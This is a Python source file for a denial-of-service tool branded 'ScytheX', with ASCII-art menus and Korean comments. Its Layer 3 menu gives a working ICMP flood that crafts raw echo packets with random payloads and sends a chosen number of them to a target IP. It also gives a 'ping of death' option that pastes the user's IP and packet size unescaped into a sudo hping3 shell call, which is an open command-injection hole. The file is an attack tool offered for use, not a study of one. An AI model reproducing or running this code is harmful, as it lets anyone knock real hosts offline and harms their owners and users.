import os
import sys
import socket
import random
import struct
import time

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 


def l3():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.BOLD + """
               ...                            
             ;::::;      =============        
           ;::::; :;        Layer 3           
        ;:::::'   :;     =============          
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#    
                    
 - icmp     |    icmpflood
 - ping     |    ping of death
 - exit     |    leave Layer3 menu
  
    """ + TextColors.RESET)

def layer3():
    while True:
        l3()
        select = input(TextColors.BOLD + "root@ScytheX > " + TextColors.RESET)

        if select == "icmp" or select.lower() == "i":
            def logo():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - ICMP FLOOD
  | - coded by 건우Sec 
                """ + TextColors.RESET)

            def icmp_packets(seq, packet_id, byte_size): # icmp 패킷 함수
                header = struct.pack('bbHHh', 8, 0, 0, packet_id, seq) 
                checksum = checksums(header)  # 데이터 무결성                                     
                header = struct.pack('bbHHh', 8, 0, socket.htons(checksum), packet_id, seq) # header 부분 ICMP 패킷 구현

                byte_payload = bytes(random.randint(0, 255) for _ in range(byte_size)) # 패킷 랜덤 생성

                return header + byte_payload # head 와 byte_payload 반환하여 icmp 패킷 결합

            def checksums(source_string): # ICMP 데이터 계산
                sum = 0 
                for i in range(0, len(source_string), 2): # 2 바이트 단위로 반복
                    if i + 1 < len(source_string): 
                        sum += (source_string[i] << 8) + source_string[i + 1] 
                    else: 
                        sum += (source_string[i] << 8) # 16 비트로 만들기
                sum = (sum >> 16) + (sum & 0xFFFF) # 결과를 16비트로 유지하면서
                sum += (sum >> 16) 
                return ~sum & 0xFFFF # 반환

            def send_packets(target_ip, byte_size, count):
                packet_id = random.randint(0, 65535) # 0 ~ 65535 까지 생성
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock: 
                    for i in range(count): # count ICMP PACKET 생성
                        packet = icmp_packets(i + 1, packet_id, byte_size) # 패킷 ID 
                        sock.sendto(packet, (target_ip, 0)) # 생성된 icmp 패킷을 IP 로 전송
                        print(TextColors.BOLD + f'[+] IP : {target_ip} [+] ICMP PACKET : {i + 1}'+ TextColors.RESET)  
                        time.sleep(0.01)  

            def icmp_main():
                logo()
                target = input(TextColors.BOLD + "IP > "+ TextColors.RESET)
                byte_size = int(input(TextColors.BOLD + "Bytes > "+ TextColors.RESET))  
                count = int(input(TextColors.BOLD + "Count > "+ TextColors.RESET)) 
                send_packets(target, byte_size, count)

            icmp_main()

        elif select == "ping" or select.lower() == "p":
            def ping():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - PING OF DEATH
  | - coded by 건우Sec 
                """ + TextColors.RESET)

                ip = input(TextColors.BOLD + "IP > "+ TextColors.RESET)
                packet = input(TextColors.BOLD + "PACKET > "+ TextColors.RESET)

                os.system(f"sudo hping3 {ip} --icmp -d {packet}")

            ping()
                        
        elif select == "exit" or select.lower() == "e":
            print(TextColors.RED + "[-] bye :("+ TextColors.RESET)
            sys.exit()